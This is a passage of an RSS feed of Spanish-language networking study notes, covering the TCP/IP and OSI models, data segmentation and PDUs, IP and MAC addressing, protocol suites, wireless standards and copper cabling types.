<br>Logical Addressing / Direccionamiento lógico (Protocolo IP): Debido a que hay muchos hosts en diferentes redes, existe la necesidad de eestrucutrar la topología de la red y el direccionamiento lógico. Dentro de TCP/IP, IP asume el direccionamiento lógico de redes y nodos. Los paquetes de datos sólo llegan a la red donde se supone que deben estar. Los métodos para hacerlo son clases de red, subredes y CIDR. 
<br>Routing / Enrutamiento (Protocolo IP): Para cada paquete de datos, se determina el siguiente nodo en cada nodo en el camino desade el remitente al receptor. De esta manera, un paquete de datos se enruta a su receptor, incluso si el remitente desconoce su ubicación.
<br>Error &amp; Control Flow / Error y flujo de control (Protocolo TCP): El remitente y el receptor frecuentemente están en contacto entre sí a través de una conexión virtual. Por lo tanto, se envían mensajes de control continuamente para comprobar si la conexión aún está establecida.
<br>Name Resolution / Resolución de nombres (Protocolo DNS): DNS proporciona resolución de nombres a través de nombres de dominio completos (FQDN) en direcciones IP, lo que nos permite llegar al host deseado con el nombre especificado en Internet.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/tcp-ip-model/tcp-ip-model.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/TCP-IP Model/TCP-IP Model.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 16 Sep 2024 16:37:45 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Data Segmentation]]></title><description><![CDATA[ 
 <br><br>Conocer el modelo de referencia <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a> y el modelo de protocolo <a data-href="TCP-IP Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/tcp-ip-model/tcp-ip-model.html" class="internal-link" target="_self" rel="noopener nofollow">TCP-IP Model</a> será útil para entender como se encapsual los datos a medida que se mueven a través de una red.<br>En teoría, una comunicación sumple, como un vídeo o un correo electrónico puede enviarse a través de la red desde un origen hacia un destino como una transmiisón de bits masiva y continua. Sin embargo, esto crearía problemas para otros dispositivos que necesitan utilizar los mismos canales de comunicación o enlaces. Estas grandes transmisiones de datos originarán retrasos importantes. Además, si falla un enlace en la infraestructura de la red interconectada durante la tranmisión, el mensaje completo se perdería y tendría que retransmitirse completamente.<br>Ante esto, el mejor método para llevar a cabo esta tranmisión, sería dividir los datos en partes más pequeñas y manejables para enviarlas a través de la red. La segmentación es el proceso de dividir un flujo de datos en unidades más pequeñas para transmisiones a través de la red. La segmentación es necesaria porque las redes de datos utilizan el conjunto de protocolos TCP/IP para enviar datos en paquetes IP individuales. Los paquetes que contienen segmentos para el mismo destino se pueden enviar a través de diferentes rutas.<br>La segmentación nos brinda un aumento en la velocidad y en la eficiencia.<br><br><br>La "Desventaja" de utilizar la segmentación y multiplexión para transmitir mensajes a través de la red es el nivel de complejidad que se agrega al proceso. Ya que cada segmento del mensaje deberá seguir un proceso de incluir un número de secuencia para garantizar que el receptor pueda volver a ensamblar el mensaje final, ya que el mensaje de descompondrá en múltiples partes.<br><img alt="data_sequencing_example_image.png" src="https://dobliuw.com/lib/media/data_sequencing_example_image.png"><br><br><br>Mientras los datos de la aplicación bajan a la pila del protocolo, y se transmiten por los medios de la red, se agrega diversa información de protocolos en cada nivel. Esto comúnmente se conoce como proceso de encapsulamiento.<br>La manera que adopta una porción de datos en cualquier capa se denomina Unidad de datos de protocolo* (PDU). Durante el encapsulamiento, cada capa encapsula las PDU que recibe de la capa inferior de acuerdo con el protocolo que se utiliza. En cada etapa del proceso, una PDU tiene un nombre distinto para reflejar sus funciones nuevas. Aunque no existen una convención universal de nombres para las PDU, en estos apuntes basados en el CCNA1 se denominan de acuerdo con los protocolos de la suite TCP/IP. Las PDU de cada tipo de datos se muestran en la siguiente imagén:<br><img alt="pdu_example_image.png" src="https://dobliuw.com/lib/media/pdu_example_image.png"><br>
<br>Datos: Término general que se utilizaen la capa de aplicación para la PDU.
<br>Segmento: PDU de la capa de transporte.
<br>Paquete: PDU de la capa de red.
<br>Trama: PDU de la capa de enlace de datos.
<br>Bit: PDU de capa física que se utiliza cuando se transmiten datos físicamente por el medio.
<br>En base al Header de transporte podemos determinar si estamos ante un datagrama o a un segmento, dado que si el header es igual a TCP es un segmento, de lo contrario, en caso de ser UDP es un datagrama.<br>Ejemplo de una segmento encapsulado:<br><img alt="tcp_segment_encapsuled_example_image.png" src="https://dobliuw.com/lib/media/tcp_segment_encapsuled_example_image.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/3.1-data-modification.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/3.1 Data Modification.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 17 Sep 2024 22:28:23 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/data_sequencing_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/data_sequencing_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Directions]]></title><description><![CDATA[ 
 <br><br>La capa de red y la capa de enlace de datos son responsables de enviar los datos desde el dispositivo de origen o emisor hasta el dispositivo final, ya sea en la misma red o a una red remota. Como se muestra en la siguiente imagen, los protocolso de las dos capas contienen las direcciones de origen y destino, pero estas tienen objetivos distintos<br>
<br>Direcciones IP: Son responsables de enviar el paquete IP desde el dispositivo de origen hasta el dispositivo final, ya sea en la misma red o a una red remota.
<br>Direcciones MAC: Son responsables de enviar la trama de elace de datos desde una tarjeta de interfaz de red (NIC) a otra en la misma red.
<br><img alt="Pasted image 20240916182253.png" src="https://dobliuw.com/lib/media/pasted-image-20240916182253.png"><br><br>Una dirección lógica de capa de red, o capa3 (Dirección IP), se utiliza para enviar el paquete IP desde el dispositivo de origen hasta el dispositivo de destino.<br><img alt="layer_3_logical_directions_ip_example_image.png" src="https://dobliuw.com/lib/media/layer_3_logical_directions_ip_example_image.png"><br>Estos paquetes contienen dos direcciones IP:<br>
<br>Dirección IP de origen: La dirección IP del dispositivo emisor, la fuente del origen del paquete.
<br>Dirección IP de destino: La dirección IP del dispositivo receptor, es decir, el destino final del paquete.
<br>Cada paquete IP contiene dos partes:<br>
<br>Porción de red (IPv4) o Prefijo (IPv6): La sección más a la izquierda de la dirección que indica la red de la que es miembro la dirección IP. TOdos los dispositivos de la misma red tienen la misma porción de red de la dirección.
<br>Porción de host (IPv4) o ID de interfaz (IPv6): La parte restante de la dirección que identifica un dispositivo específico de la red. La sección de host es única para cada dispositivo o interfaz en la red.
<br><br><br>En este punto, es importante tener en cuenta que a la hora de la transmisión de datos, los mismos contaran con una dirección fuente y destino tanto para la capa 2 de enlace de datos como para la capa 3 de red, correspondientes a la dirección MAC (Data Link Layer - N°2) y dirección IP (Network Layer - N°3).<br><img alt="Pasted image 20240916183107.png" src="https://dobliuw.com/lib/media/pasted-image-20240916183107.png"><br>Cuando el emisor y el receptor del paquete IP están en la misma red, la trama de enlace de datos se envía directamente al dispositivo receptor. En una red Ethernet, las direcciones de enlace de datos se conocen como direcciones de Control de acceso a medios de Ethernet (MAC), como se muestra en la siguiente imagen:<br><img alt="Pasted image 20240916183217.png" src="https://dobliuw.com/lib/media/pasted-image-20240916183217.png"><br>Es importante saber que estas direcciones MAc se encuentran integradas físicamente a la NIC (Network Interface Card) Ethernet.<br><br><br>Por otro lado, cuando el emisor del paquete se encuentra en una red distinta de la del receptor, las direcciones IP de origen y de destino representan hosts de distintas redes. Lo que indica.<br><img alt="Pasted image 20240916183423.png" src="https://dobliuw.com/lib/media/pasted-image-20240916183423.png"><br>Cuando el emisor y receptor del paquete IP se encuentran en redes diferentes, la trama de enlace de datos de Ethernet no se puede enviar directamente al host de destino, debido a que en la red del emisor no se puede tener acceso directamente al host. La trama de Ethernet se debe enviar a otro dipositivo conocido como Router o Default Gateway. En este ejemplo, el default gateway corresponde al dispositivo con nombre "R1". Este dispositivo tiene una dirección MAC que se encuentra en la misma red que el dispositivo de origen con nombre PC1. Esto permite que PC1 enlace el router directamente.<br><img alt="Pasted image 20240916183654.png" src="https://dobliuw.com/lib/media/pasted-image-20240916183654.png"><br>La trama de Ethernet con el paquete IP encapsulado ahora se puede transmitir a R1. Este router reenviará el paquete al destino, el servidor web.<br>Ahora bien, como? Bueno... la dirección MAC de capa 2 (Data Linnk), tiene la función de enviar la trama de enlace de datos desde una interfaz de red hasta otra interfaz de red en la misma red.<br>Antes de que un paquete IP pueda enviarse a través de una rede conectada por cable o inalámbrica, se debe encapsular en una trama de enlace de datos de modo que pueda transmitirse a través del medio físico.<br>Lo que nos da a entender que le flujo de transmisión que obtendrá el paquete IP será desde el host destino PC1 a R1, de R1 a R2y finalmente de R2 al servidor web.<br>Es importante tener en cuenta que la dirección de capa de red, o dirección IP, no será cambiada entre paquete y paquete como si ocurrirá con la dirección de capa de enlace de datos, o direcicón MAC, ya que a medida que el paquete viaja entre los distintos dispositivos, el mismo es encapsulado en una nueva trama de enlace de datos en cada punto del recorrido. ]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/3.2-accessing-data.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/3.2 Accessing data.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 16 Sep 2024 21:42:52 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20240916182253.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20240916182253.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[OSI vs TPC-IP Model]]></title><description><![CDATA[ 
 
  
  
  
    
  
  OSI Model7. Application                    FPT, HTTP6. Presentation        PNG, PNG, SSL, TXT5. Session                          NetBIOS4. Transport                      TCP, UDP2. Data-Link                  Switch, Bridge1. Physical                     Network Card3. Network                Router, L3 SwitchHosts LayersMedia LayersTCP/IP Model4. Application2. Internet1. Link3. TransportPDUDataTramasPaquetesBits]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-vs-tpc-ip-model.excalidraw.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/OSI vs TPC-IP Model.excalidraw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 09 Jan 2024 21:18:55 GMT</pubDate></item><item><title><![CDATA[Transmission]]></title><description><![CDATA[ 
 <br><br>Las redes pueden variar en lo que respecta al tamaño, forma y la función. Puede ser muy compleja o muy simple... pero sin importar esto, la conexión entre los dispositivos de la red no es suficiente para habilitar la comunicación. Para que se produzca esta, los dispositivos deben saber "como" comunicarse, por lo que aca es cuando entran en juego los protocolos de comunicación.<br>De esta manera, una transmisión de datos se da mediante distintos protocolos de comunicación que establecen reglas y requisitos a la par que se encargan de codificar, formatear y encapsular el mensaje, así como a su vez manejar lo que respecta al tamaño, sincronización y opciones de entrega del mismo.<br><br><br>Los protocolos utilizados en las comunicaciones de red comparten muchos de estos fundamentos. Además de identificar el origen y el destino, los protocolos informáticos y de red definen los detalles sobre la forma en que los mensajes se transmiten a través de una red. Los protocolos informáticos comunes incluyen los siguientes requisitos:<br>
<br>Formato de los datos que se envían.
<br>Métodos para iniciar, mantener y finalizar la comunicación.
<br>Requisitos para el manejo de errores y control de flujo.
<br><br>La codificación se refiere a cómo se transforman los datos que se deben enviar en una seucencia de bits (0s y 1s) que pueda ser transmitida a través de los distintos medios (<a data-href="0. Network Components#Network media" href="https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/0.-network-components.html#Network_media" class="internal-link" target="_self" rel="noopener nofollow">0. Network Components &gt; Network media</a>) físicos.<br>
<br>ASCII o UTF-8 son estándares de codificación comunes para transformar a texto.
<br>A nivel físico, la codificación también se refiere a cómo los bits son representados en señales eléctricas o luminosas (Según el medio físico de transmisión).
<br><br>Los mensajes se dividen en paquetes, y cada protocolo puede agregar su propia cabecera (Header) o pie de página de información, lo que se llama encapulación. Esto incluye:<br>
<br>Header: El encabezado contiene la información sobre el origen, el destino, el tipo de protocolo usado, la longitud del paquete, entre otros.
<br>Data: Los datos son el contenido real, el mensaje que se desea enviar.
<br>Trailer (Si aplica): Algunas tecnologías, como Ethernet, incluyen un trailer con información para verificar la integridad del paquete (Checksum).
<br>En el caso del modelo TCP/IP:<br>
<br>Un mensaje se encapsula en un segmento de transporte (En la capa de aplicación).
<br>Un segmento de transporte se encapsula en un paquete (En la capa de red).
<br>Un paquete se encapsula en una trama (En la capa de enlace de datos).
<br><br>El tamaño de los mensajes varían según el protocolo y el medio. Por ejemplo:<br>
<br>Ethernet  tiene un tamaño máximo de trama de 1500 bytes (Payload máximo), más una cabecera de 14 bytes.
<br>En TCP, el tamaño máximo de segmento depende de la MTU (Maximum Transmission Unit) de la red. Si el mensaje excede ese tamaño se fragmenta.
<br>El tamaño adecuado es importante porque si se envían mensajes demasiado grandes, pueden requerir fragmentación, lo que reduce la eficiencia de la transmisión.<br><br>La sincronización asegura que el receptor pueda interpretar correctamente los datos en el orden correcto. Los dispositivos deben:<br>
<br>Estar de acuerdo en cúando comienza y termina una transmisión.
<br>Usar un reloj común o sistemas de marcadores dentro de las tramas para definir los límites entre los bits o bytes. En redes basadas en Ethernet, la sincronización se maneja a  nivel de la señalización física con esquemas de codificación como Manchester Encoding o 4B/5B
<br><br>TCP garantiza que los mensajes se entregan y se ordenan correctamente, con verificación de errores y retransmisión si es necesario. UDP, en cambio, no garantiza la entrega, lo que lo hace más eficiente en la aplicación donde la velocidad es más importante que la confiabilidad (Por ejemplo, en streaming de videos).<br>El método de entrega de los mensajes puede variar según el protocolo, pero estos pueden ser:<br>
<br>Unicast: Entrega a un solo dispositivo.
<br>Multicast: Entrega a uno o un grupo de dispositivos.
<br>Broadcast: Entrega a todos los dispositivos de la red.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/0.-transmission.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/0. Transmission.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 09 Oct 2024 20:49:11 GMT</pubDate></item><item><title><![CDATA[Network Protocols]]></title><description><![CDATA[ 
 <br><br>Como vimos en la sección de <a data-href="0. Transmission" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/0.-transmission.html" class="internal-link" target="_self" rel="noopener nofollow">0. Transmission</a>, la comunicación entre dispositivos finales (Endpoints) se da entre protocolos de comunicación.<br>Los protocolos de red definen un formato y un conjunto de reglas comunes para intercambiar mensajes entre dispositivos. Los protocolos son implementados por dispositivos finales y dispositivons intermediarios en software, hardware o ambos. Cada protocolo de red tiene su propia función, formato y reglas para llevar a cabo la correcta transmisión de datos.<br>En la siguiente tabla se enumerarán los distintos tipos de protocolos que se necesitan para habilitar las comunicaciones en una o más redes:<br><br><br><br>Los protocolos de comunicación de red son responsables de una variedad de funciones necesarias para las comunicaciones de red entre dispositivos finales. Estas funciones son:<br><br>Un mensaje  enviado a través de una red informática normalmente requiere el uso de varios protocolos, cada uno con sus propias funciones y formato. La siguiente imagén muestra un ejemplo de algunos protooclos de red comunes que se utilizan cuando un dispositivo envía una solicitud a un servidor web.<br><img alt="network_protocols_get_web_example_image.png" src="https://dobliuw.com/lib/media/network_protocols_get_web_example_image.png"><br><br><br>Como sabemos, una Suite es un conjunto de, en este caso, protocolos que trabajan juntos para permitir la comunicación en una red. Estos protocolos, aunque están diseñados para funciones específicas, son complementarios entre sí y forman parte de un sistema más grande proporcionando servicios integrales de comunicaicón de red.<br>Desde la década de 1970 han habido distntas suites de protocolos diferentes, algunos desarrolados por organizaciones con estándares y otros por diversos proveedores.<br><img alt="suite_protocols_evolution_image_example.png" src="https://dobliuw.com/lib/media/suite_protocols_evolution_image_example.png"><br>
<br>ITCP/IP: Este es el conjunto de protocolos más común y relevante utilizados hoy en día. El conjutno de protolos TPC/IP es un conjunto de protocolos estándar abierto mantenido por la IETF (Internet Engineering Task Force).
<br>OSI (Open Systems Interconection): Esta es uan familia de protooclos desarrollados conjuntamente en 1977 por la Organización Internacional de Normalización (ISO) y la Unión Internaciaonl de Telecomunicaciones (UIT). El protocolo OSI también incluía un modelo de site capas llamado OSI Model. Este modelo categoriza las funciones de sus protocolos. Hoy OSI es conocido principalmente por su modelo en capas ya que los protooclos OSI han sido reemplazados en gran medida por TCP/IP.
<br>AppleTalk: un paquete de protooclos propietario de corta duración lanzado por Apple Inc. en 1985 para dispositivos Apple. En 1995 Apple adoptó TCP/IP para reemplazar esta suite.
<br>Novell NetWare: Un conjunto de protocolos propietarios de corta duración y sistema operativo de red desarrollado por Novell Inc. utilizando el protocolo de red IPX. En 1995, Novell adoptó TCP/IP para reemplazar a IPX.
<br>Hoy en día predominan dos modelos encargados de describir las redes, por un lado <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a>, encargado de describir el trabajo de las redes en 7 capas, y por otro lado, el <a data-href="TCP-IP Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/tcp-ip-model/tcp-ip-model.html" class="internal-link" target="_self" rel="noopener nofollow">TCP-IP Model</a>, encargado de aplicar el trabajo de las redes. Estos constan de un modelo teorica y práctico.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/1.-network-protocols.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/1. Network Protocols.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 12 Sep 2024 20:23:59 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/network_protocols_get_web_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/network_protocols_get_web_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Wireless media Properties]]></title><description><![CDATA[ 
 <br><br>La tercera forma de contectarse a la capa física de una red es mediante los merios inalámbricos.<br>Los medios inalámbricos transportan señales electromagnéticas que representan los dígitos binarios de las comunicaciones de datos mediante frecuencias de radio y de microondas. Estos medios proporcionan las mejores opciones de movilidad de todos los medios y la cantidad de dispositivos habilitados para tecnología inalámbrica sigue en aumento. La tecnología inalámbrica es ahora la principal forma en que los usuarios se conecta a las redes domésticas y empresariales.<br>Algunas de las limitaciones de este tipo de tecnologías son:<br>
<br>Área de cobertura: Las tecnologías inalámbricas de comunicación de datos funcionan bien en entornos abiertos. Sin embargo, existen determinados materiales de construcción utilizados en edificios y estructuras, además del terreno local, que limitan la cobertura efectiva.
<br>Interferencia: La tecnología inalámbrica también es vulnerable a interferencia, y puede verse afectada por dispositivos comunes como teléfonos inalámbricos domésticos, algunos tipos de luces fluorescentes, hornos microondas y otras comunicaciones inalámbricas.
<br>Seguridad: La cobertura de la comunicación inalámbrica no requiere acceso a un hilo físico de un medio. Por lo tanto, dispositivos y usuarios sin autorización para accedera la red pueden obtener acceso a la transmisión y recepción de datos. La seguridad de la red es un componente principal de la administración de redes inalámbricas.
<br>Medio compartido: WLAN opera en un medio duplex, lo que significa que solo un dispositivo puede enviar o recibir a la vez. El medio inalámrbico se comparte entre todos los usuarios inalámbricos. Muchos usuarios que acceden a la WLAN simultáneamente resultan en un ancho de banda reducido para cada usuario.
<br>Si bien este tipo de conectividad está aumentando en popularidad, el <a data-href="0. Copper Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/0.-copper-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Copper Wiring</a> y la <a data-href="0. Fiber Optic Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/fiber-optic/0.-fiber-optic-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Fiber Optic Wiring</a> siguen siendo los medios de capa física más populares para la implementación de dispositivos de red intermedios, como Switches y Routers.<br><br><br>Los estándares de IEEE y del sector de las telecomunicaciones sobre las comunicaciones inalámbricas de datos abarcan la capa física y de enlace de datos. En cada uno de estos estándares, las específicaciones de la capa física se aplican a áreas que incluyen:<br>
<br>Codificación de señales de datos a señales de radio.
<br>Frecuencia e intensidad de la transmisión.
<br>Requisitos de recepción y decodificación de señales.
<br>Diseño y construcción de antenas.
<br>Estos son los estándares inalámbricos:<br>
<br>
Wi-Fi (IEEE 802.11): Tecnología de red LAN inalámbrica (WLAN), comúnmente llamada Wi-Fi. WLAN utiliza un protocolo por contención conocido como acceso múltiple por detección de portadora con prevención de colisiones (CSMA/CA). La NIC inalámbrica primero debe escuchar antes de transmitir para determinar si el canal de radio está libre. Si otro dispositivo inalámbrico está transmitiendo, entonces la NIC deberá aguardar hasta que el canal esté libre. Wi-Fi es una marca comercial de Wi-Fi Alliance. Wi-Fi se utiliza con dispositivos WLAN certificados basados en los estándares IEEE 802.11.

<br>
Bluetooth (IEEE 802.15): Este es una estándar de red de área personal inalámbrica (WPAN), comúnmnete conocida como "Bluetooth". Utiliza un proceso de emparejamiento de dispositivos para distancias de 1 a 100 metros.

<br>
WiMAX (IEEE 802:16): Comúmente conocida como Interoperabilidad mundial para el acceso por microondas (WiMAX), utiliza una topología punto a multipunto para proporcionar un acceso de ancho de banda inalámbrico.

<br>
Zigbee (IEEE 802.15.4): Zigbee es una especificación utilizada para comunicaciones de baja velocidad de datos y baja potencia. Está diseñado para aplicaciones que requieren corto alcance, baja velocidad de datos y larga duración de la batería. Zigbee se utiliza normalmente para entornos industriales e Internet de las cosas (IoT), tales como interruptores de luz inalámbricos y recopilación de datos de dispositivos médicos.

<br><br><br>Una implementación común de te cnología inalámbrica de datos permite a los dispositivos conectarse en forma inalámbrica a través de una LAN. En general, una WLAN requiere los siguientes dispositivos de red:<br>
<br>Punt de acceso inalámbrico (AP): Conecta las señales inalámbricas de los usuarios y se conecta a la infraestructura de red existente basada en cobre, como Ethernet. Los routers inalámbricos domésticos y de pequeñas empresas integran las funciones de un router, un switch y un access point (AP) en un solo dispositivo, como el que se mostrará a continuación en la imagen.
<br><img alt="cisco_meraki_example_image.png" src="https://dobliuw.com/lib/media/cisco_meraki_example_image.png"><br>
Cisco Meraki MX64W<br>
<br>Adaptadores NIC inalámbricos: Brindan capacidad de comunicaciones inalámbricas a los hosts de red.
<br>A medida que la tecnología fue evolucionando, surgió una gran cantidad de estándares WLAN basados en Ethernet. Los beneficios de las tecnologías inalámbricas de comunicación de datos son evidentes, especialmente en cuanto al ahorro en el cableado costoso de las instalaciones y en la conveniencia de la movilidad del host. Los administradores de red deben desarrollar y aplicar políticas y procesos de seguridad estrictos para proteger las WLAN del acceso no autorizado y los daños.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wireless/0.-wireless-media.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/0. Layer 1 and 2/1. Physical/Wireless/0. Wireless media.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 25 Sep 2024 19:40:41 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/cisco_meraki_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/cisco_meraki_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Copper Wiring]]></title><description><![CDATA[ 
 <br><br>El cableado de cobre es el tipo más común de cableado utilizado en las redes. De hecho, el cableado de cobre no es solo un tipo de cable. Hay tres tipos diferentes de cableado de cobre que se utilizan cada uno en situaciones epecíficas.<br>Las redes utilizan medios de cobre porque son económicos y fáciles de instalar, y tiene baja resistencia a la corriente eléctrica. Sin embargo, estos medios están limitados por la distancia y la interferencia de señal.<br>Como sabemos, los datos se transmiten en cables de cobre como impulsos eléctricos. Un detector en la interfaz de red de un dispositivo de destino debe recibir una señal que pueda decodificarse exitosamente para que coincida con la señal enviada. No obstante, cuanto más lejos viaja una señal, más se deteriora. Esto se denomina atenuación de señal. Por este motivo, todos los medios de cobre deben seguir limitaciones de distancia estrcitas según lo específican los estándares que los rigen.<br>Los valores de temporización y voltaje de los pulsos eléctricos también son vulnerables a las interferencias de dos fuentes:<br>
<br>Interferencia electromagnética (EMI) o interferencia de radiofrecuencia (RFI): Las señales de EMI y RFI pueden distorcionar y dañar las señales de datos que transportan los medios de cobre. Las posibles fuentes de EMI y RFI incluyen las ondas de radio y dispostivios electromagnéticos, como las luces cluorescentes o los motores eléctricos.
<br>Crosstalk: Se trata de una perturbación causada por los campos eléctricos o magnéticos de una señal de un hilo a la señal de un hilo adyacente. En los circuitos telefónicos, el crosstalk puede provar que se escuche parte de otra conversación de voz de un circuito adyacente. En especial, cuando una corriente eléctrica fluye por un hilo, crea un pequeño campo magnético circular alrededor de dicho hilo, que puede captar un hilo adyacente.
<br><img alt="modificacion_de_señal_por_interferencia_example_image.png" src="https://dobliuw.com/lib/media/modificacion_de_señal_por_interferencia_example_image.png"><br>
<br>Se transmite una señal digital pura.
<br>En el medio, hay una señal de interferencia.
<br>La señal digital está dañada por la interferencia.
<br>El equipo receptor lee una señal cambiada.
<br>Para contrarrestar estos efectos negativos del EMI y del RFI, algunos tipos de cables de cobre se empaqueta con un blindaje metálico y requieren una conexión a tierra adecuada.<br>Por otro lado, para contrarrestar los efectos del crosstalk, algunos tipos de cables de cobre tienen pares de hilos de circuitos opuestos trenzados que cancelan dicho tipo de interferencia en forma eficaz.<br>De igual manera, estos efectos pueden ser contrarrestados teniendo en cuenta:<br>
<br>La elección del tipo o la categoría de cable más adecuada al entorno de red determinado.
<br>El diseño de una infraestructura de cables para evitar las fuentes de interferencia posibles yconocidas en la estructura del edificio.
<br>El uso de técnicas de cableado que inlcuyen el manejo y la terminación apropiada de los cables. 
<br><br><br>Existen tres tipos princiaples de medios de cobre que se utilizan en las redes.<br>
<br>Unshielded Twisted Pair (UTP).
<br>Shielded Twisted Pair (STP).
<br>Cooaxial.
<br><br>El cableado de par trenzado no blindado (UTP) es el medio de red más común. El cableado UTP, que se termina con conectores RJ-45, se utiliza para interconectar hosts de red con dispositivos intermediarios de red, como switches y routers.<br>En las redes LAN, este cable consta de cuatro pares de hilos codificados por colores que están trenzados entre sí y recubiertos con un revestimiento de plástico flexible que los protege contra daños físicos menores. El trenzado de los hilos ayuda a proteger contra las interferencias de otros hilos (Crosstalk).<br><img alt="upt_cable_example_image.png" src="https://dobliuw.com/lib/media/upt_cable_example_image.png"><br>Estos números identifican algunas cracterísticas claves de este cable:<br>
<br>La cubierta exterior protege los cables de cobre del daño físico.
<br>Los pares trenzados protegen la señal de interferencias.
<br>El aislamiento de plástico codificado por colores aísla eléctricamente lso cables entre sí e identifica cada par.
<br>Dado que este tipo de cableado es el estándar para uso en las LAN, se dedicara una sección exclusiva al mismo, la cual dispondrá de sus ventajas y limitaciones, así como qué se puede hacer para evitar problemas. (<a data-href="1. UTP Cable" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/1.-utp-cable.html" class="internal-link" target="_self" rel="noopener nofollow">1. UTP Cable</a>)<br><br>El par trenzado blindado (STP) proporciona una mejor protección contra ruido que el cableado UTP. Sin embargo, en comparación con el cable UTP, el cable STP es mucho más costoso y difícil de instalar. Al igual que el cable UTP, el STP utiliza un conector RJ-45.<br>El cable STP combina las técnicas de blindaje para contrarrestar la EMI y la RFI, y el trenzado de hilo para contrarrestar el Crosstalk. Para obtener los máximos beneficios del blindaje, los cables  STP se terminan con conector de datos STP blindados especiales. Si el cable no se conecta a tierra correctamente, el blindaje puede actuar como antena y captar señales no deseadas.<br>El cable STP se utiliza cuatro pares de hilos. Cada uno de estos pares está empaquetado primero con un blindaje de hoja metálica y, luego, el conjunto se empaqueta con una malla tejida o una hoja metálica.<br>Estos números identifican algunas características claves de este cable:<br><img alt="stp_cable_example_image.png" src="https://dobliuw.com/lib/media/stp_cable_example_image.png"><br>
<br>Cubierta exterior.
<br>Escudo trenzado o de aluminio.
<br>Escudos de aluminio.
<br>Pares trenzados.
<br><br>El cable coaxial obtiene su nombre del hecho de que hay dos conductores que comparten el mismo eje. Como se mostrará en la imagen, el cable coaxial consta de:<br>
<br>Utilizar un conductor de cobre para transmitir las señales electrónicas.
<br>Una capa de aislamiento plástico flexible que rodea al conductor de cobre.
<br>Malla de cobre tejida o una hoja metálica que actúa como segundo hilo en el circuito y como blindaje para el conductor interno. La segunda capa o blindaje reduce la cantidad de intererencias electromagnéticas externas.
<br>La totalidad del cable está cubierta por un revestimiento para evitar daños físicos menores.
<br>Existen dierentes tipos de conectores con cable coaxial. Los conectores Bayoneta Neil-Concelman (BNC), tipo N y tipo F.<br>Aunque el cable UTP ha reemplazado esencialmente el cable coaxial e nlas instalaciones de Ethernet modernas, el diseño de este cable se usa en las siguientes situaciones:<br>
<br>Instalaciones inalámbricas: Los cables coaxiales conectan antenas a los dispositivos inalámbricos. También transportan enegería de readiofrecuencia (RF) entre las antenas y el equipo de radio.
